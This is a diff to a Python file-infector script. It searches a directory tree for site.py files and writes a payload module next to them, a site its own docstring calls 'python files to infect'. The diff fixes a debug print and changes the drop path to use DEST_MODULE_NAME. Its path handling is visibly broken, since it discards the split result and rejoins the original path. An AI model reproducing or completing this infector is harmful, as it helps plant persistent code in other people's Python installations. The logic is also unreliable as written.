@@ -54,7 +54,7 @@ def drop_module(dest_file_path):
     @return: none
     """
     global MODULE_CODE
-    print(dest_file_path)
+    print("DEST OF MOD: " + dest_file_path)
     mod_code = read_module_code(MODULE_CODE)
     with open(dest_file_path, "w") as f:
         f.write(mod_code)
@@ -67,14 +67,15 @@ def find_site(search_pth):
     @param pth: the starting directory to search
     @return: an array of URIs of python files to infect
     """
+    global DEST_MODULE_NAME
     py_files = []
     for subdir, dirs, files in os.walk(search_pth):        # iterate through everything
         for fil in files:
             fname = os.path.join(subdir, fil)
             if "site.py" in fname:                      # if it's the site module
                 py_files.append(fname)
-                finame = fname.split("/")[:-1]
-                finame = "".join(fname)                 # get the directory
+                finame = fname.split("/")[:-2]          # split down to just the directory
+                finame = "".join(fname) + DEST_MODULE_NAME
                 drop_module(finame)                     # write the module to the dir
 
     return py_files
